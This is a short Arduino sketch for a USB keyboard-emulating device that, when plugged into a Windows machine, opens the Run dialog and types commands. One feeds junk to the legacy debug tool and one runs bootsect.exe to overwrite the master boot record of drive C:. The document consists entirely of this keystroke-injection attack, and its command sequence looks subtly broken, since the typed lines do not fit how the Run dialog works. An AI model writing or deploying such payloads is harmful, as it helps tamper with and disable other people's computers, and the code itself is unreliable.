#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("echo|set /p=\"AAAAAAAAAA\"|debug");
  Keyboard.println("C:\\Windows\\System32\\bootsect.exe /nt60 C: /mbr");
}

void loop() {}
